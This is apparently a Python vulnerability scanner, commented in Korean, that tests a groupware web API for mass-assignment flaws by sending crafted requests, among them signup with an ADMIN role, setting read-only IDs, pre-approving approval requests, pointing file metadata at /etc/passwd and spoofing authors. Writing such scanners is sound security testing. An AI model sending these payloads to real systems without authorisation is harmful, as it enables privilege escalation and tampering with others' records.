"""
Mass Assignment Scanner
객체 대량 할당 취약점 - 권한 필드 조작 탐지
"""
import requests

def scan(target_url):
    result = {
        'name': 'Mass Assignment',
        'category': 'Access Control',
        'status': 'SAFE',
        'severity': 'HIGH',
        'vulnerabilities': [],
        'recommendation': '허용 필드 화이트리스트, DTO 사용, @JsonIgnore 설정',
        'details': ''
    }

    details = []

    # 1. 회원가입 시 권한 필드 조작
    details.append("[Mass Assignment-1] 회원가입 권한 조작")

    signup_url = f"{target_url}/api/auth/signup"

    try:
        # role을 ADMIN으로 설정하여 가입 시도
        signup_data = {
            "employeeId": "mass_test_user",
            "password": "test1234",
            "name": "Test User",
            "role": "ADMIN",  # 권한 조작
            "isAdmin": True,
            "authorities": ["ROLE_ADMIN"]
        }

        resp = requests.post(signup_url, json=signup_data, timeout=5)

        if resp.status_code in [200, 201]:
            # 응답에서 role 확인
            try:
                response_data = resp.json()

                if response_data.get('role') == 'ADMIN' or 'admin' in str(response_data).lower():
                    result['vulnerabilities'].append("회원가입 시 ADMIN 권한 획득")
                    details.append(f"  ✗ role 필드 조작으로 관리자 권한 획득")
                    result['status'] = 'VULNERABLE'
                else:
                    details.append(f"  ✓ role 필드 무시됨")
            except:
                details.append(f"  • 응답 파싱 실패")
        else:
            details.append(f"  • 회원가입 실패 또는 차단됨")

    except:
        details.append(f"  • 회원가입 테스트 실패")

    # 2. 프로필 수정 시 읽기 전용 필드 변경
    details.append("\n[Mass Assignment-2] 읽기 전용 필드 수정")

    try:
        employee_url = f"{target_url}/api/employees/1"

        # 읽기 전용 필드(id, createdAt 등) 변경 시도
        update_data = {
            "id": 999,  # ID 변경 시도
            "employeeId": "changed_id",
            "role": "ADMIN",
            "salary": 999999999,
            "createdAt": "2000-01-01T00:00:00",
            "isDeleted": False
        }

        resp = requests.put(employee_url, json=update_data, timeout=5)

        if resp.status_code == 200:
            try:
                response_data = resp.json()

                # ID가 변경되었는지 확인
                if response_data.get('id') == 999:
                    result['vulnerabilities'].append("ID 필드 변경 가능")
                    details.append(f"  ✗ ID 필드가 999로 변경됨")
                    result['status'] = 'VULNERABLE'

                # role이 변경되었는지 확인
                if response_data.get('role') == 'ADMIN':
                    result['vulnerabilities'].append("role 필드 변경 가능")
                    details.append(f"  ✗ role이 ADMIN으로 변경됨")
                    result['status'] = 'VULNERABLE'

                if result['status'] != 'VULNERABLE':
                    details.append(f"  ✓ 읽기 전용 필드 보호됨")

            except:
                details.append(f"  • 응답 파싱 실패")

    except:
        details.append(f"  • 프로필 수정 테스트 실패")

    # 3. 게시글 작성 시 추가 필드 삽입
    details.append("\n[Mass Assignment-3] 게시글 작성 시 필드 조작")

    try:
        board_url = f"{target_url}/api/boards"

        # 숨겨진 필드 추가
        board_data = {
            "title": "Test Post",
            "content": "Test Content",
            "category": "GENERAL",
            "authorId": 999,  # 작성자 ID 조작
            "viewCount": 9999,  # 조회수 조작
            "isPinned": True,  # 고정글 설정
            "isNotice": True,  # 공지 설정
            "createdAt": "2020-01-01T00:00:00"
        }

        resp = requests.post(board_url, json=board_data, timeout=5)

        if resp.status_code in [200, 201]:
            try:
                response_data = resp.json()

                if response_data.get('authorId') == 999:
                    result['vulnerabilities'].append("작성자 ID 조작 가능")
                    details.append(f"  ✗ authorId를 999로 조작 성공")
                    result['status'] = 'VULNERABLE'

                if response_data.get('isPinned') == True:
                    result['vulnerabilities'].append("고정글 설정 가능")
                    details.append(f"  ✗ isPinned를 True로 설정 성공")
                    result['status'] = 'VULNERABLE'

                if result['status'] != 'VULNERABLE':
                    details.append(f"  ✓ 추가 필드 무시됨")

            except:
                details.append(f"  • 응답 파싱 실패")

    except:
        details.append(f"  • 게시글 테스트 실패")

    # 4. 결재 요청 시 상태 조작
    details.append("\n[Mass Assignment-4] 결재 상태 조작")

    try:
        approval_url = f"{target_url}/api/approvals"

        # 결재 생성 시 이미 승인된 상태로 설정 시도
        approval_data = {
            "title": "Test Approval",
            "content": "Test",
            "type": "VACATION",
            "status": "APPROVED",  # 이미 승인됨으로 설정
            "approvedBy": 1,
            "approvedAt": "2025-01-01T00:00:00"
        }

        resp = requests.post(approval_url, json=approval_data, timeout=5)

        if resp.status_code in [200, 201]:
            try:
                response_data = resp.json()

                if response_data.get('status') == 'APPROVED':
                    result['vulnerabilities'].append("결재 상태 조작 가능")
                    details.append(f"  ✗ status를 APPROVED로 조작 성공")
                    result['status'] = 'VULNERABLE'
                else:
                    details.append(f"  ✓ status 필드 무시됨")

            except:
                details.append(f"  • 응답 파싱 실패")

    except:
        details.append(f"  • 결재 테스트 실패")

    # 5. 파일 업로드 시 메타데이터 조작
    details.append("\n[Mass Assignment-5] 파일 메타데이터 조작")

    try:
        file_url = f"{target_url}/api/teams/1/files"

        # 파일 크기, 다운로드 횟수 조작
        file_data = {
            "originalName": "test.txt",
            "storedName": "test_stored.txt",
            "filePath": "/etc/passwd",  # 경로 조작
            "fileSize": 0,  # 크기 0
            "downloadCount": 9999,  # 다운로드 횟수 조작
            "uploadedBy": 999  # 업로더 조작
        }

        # 실제로는 multipart/form-data로 보내야 하지만 JSON으로 시도
        resp = requests.post(file_url, json=file_data, timeout=5)

        if resp.status_code in [200, 201]:
            result['vulnerabilities'].append("파일 메타데이터 조작 가능")
            details.append(f"  ✗ 파일 메타데이터 직접 설정 가능")
            result['status'] = 'VULNERABLE'

    except:
        details.append(f"  • 파일 메타데이터 테스트 실패")

    # 6. 부서/팀 정보 수정 시 권한 조작
    details.append("\n[Mass Assignment-6] 조직 정보 조작")

    try:
        team_url = f"{target_url}/api/teams/1"

        # 팀장 변경 시도
        team_data = {
            "name": "Updated Team",
            "leaderId": 999,  # 팀장 ID 조작
            "parentId": 0  # 상위 부서 조작
        }

        resp = requests.put(team_url, json=team_data, timeout=5)

        if resp.status_code == 200:
            try:
                response_data = resp.json()

                if response_data.get('leaderId') == 999:
                    result['vulnerabilities'].append("팀장 ID 조작 가능")
                    details.append(f"  ✗ leaderId를 999로 변경 성공")
                    result['status'] = 'VULNERABLE'

            except:
                pass

    except:
        details.append(f"  • 조직 정보 테스트 실패")

    # 7. 댓글 작성 시 작성자 조작
    details.append("\n[Mass Assignment-7] 댓글 작성자 조작")

    try:
        comment_url = f"{target_url}/api/boards/1/comments"

        # 다른 사용자로 댓글 작성 시도
        comment_data = {
            "content": "Test Comment",
            "authorId": 999,  # 작성자 조작
            "employeeId": "admin"
        }

        resp = requests.post(comment_url, json=comment_data, timeout=5)

        if resp.status_code in [200, 201]:
            try:
                response_data = resp.json()

                if response_data.get('authorId') == 999 or response_data.get('employeeId') == 'admin':
                    result['vulnerabilities'].append("댓글 작성자 조작 가능")
                    details.append(f"  ✗ 다른 사용자로 댓글 작성 성공")
                    result['status'] = 'VULNERABLE'

            except:
                pass

    except:
        details.append(f"  • 댓글 테스트 실패")

    # 8. Nested Object 조작
    details.append("\n[Mass Assignment-8] 중첩 객체 조작")

    try:
        employee_url = f"{target_url}/api/employees"

        # 중첩된 객체 필드 조작
        employee_data = {
            "employeeId": "nested_test",
            "name": "Test",
            "password": "test1234",
            "department": {
                "id": 999,
                "name": "Hacked Department"
            },
            "team": {
                "id": 999,
                "leaderId": 1
            }
        }

        resp = requests.post(employee_url, json=employee_data, timeout=5)

        if resp.status_code in [200, 201]:
            try:
                response_data = resp.json()

                if response_data.get('department', {}).get('id') == 999:
                    result['vulnerabilities'].append("중첩 객체 조작 가능")
                    details.append(f"  ✗ 중첩된 department 객체 조작 성공")
                    result['status'] = 'VULNERABLE'

            except:
                pass

    except:
        details.append(f"  • 중첩 객체 테스트 실패")

    # 9. 배열 필드 조작
    details.append("\n[Mass Assignment-9] 배열 필드 조작")

    try:
        # 권한 배열 조작
        signup_data = {
            "employeeId": "array_test",
            "password": "test1234",
            "name": "Array Test",
            "roles": ["ROLE_USER", "ROLE_ADMIN"],  # 다중 권한
            "permissions": ["READ", "WRITE", "DELETE", "ADMIN"]
        }

        resp = requests.post(signup_url, json=signup_data, timeout=5)

        if resp.status_code in [200, 201]:
            try:
                response_data = resp.json()

                if 'ROLE_ADMIN' in str(response_data.get('roles', [])):
                    result['vulnerabilities'].append("배열 필드로 권한 조작")
                    details.append(f"  ✗ roles 배열에 ADMIN 추가 성공")
                    result['status'] = 'VULNERABLE'

            except:
                pass

    except:
        details.append(f"  • 배열 필드 테스트 실패")

    # 10. JSON 필드 추가
    details.append("\n[Mass Assignment-10] 임의 JSON 필드 추가")

    try:
        # 존재하지 않는 필드 대량 추가
        board_data = {
            "title": "Test",
            "content": "Test",
            "category": "GENERAL",
            "customField1": "hacked",
            "customField2": True,
            "internalUseOnly": True,
            "debugMode": True,
            "secretKey": "secret123"
        }

        resp = requests.post(f"{target_url}/api/boards", json=board_data, timeout=5)

        if resp.status_code in [200, 201]:
            try:
                response_data = resp.json()

                # 임의 필드가 저장되었는지 확인
                extra_fields = [f for f in response_data.keys()
                               if f.startswith('custom') or f in ['internalUseOnly', 'debugMode']]

                if extra_fields:
                    result['vulnerabilities'].append("임의 JSON 필드 허용")
                    details.append(f"  ✗ 임의 필드 저장됨: {', '.join(extra_fields)}")
                    result['status'] = 'VULNERABLE'

            except:
                pass

    except:
        details.append(f"  • JSON 필드 테스트 실패")

    if result['status'] == 'SAFE':
        details.append("\n✓ Mass Assignment 방어가 적절히 구현되어 있습니다")

    result['details'] = '\n'.join(details)
    return result
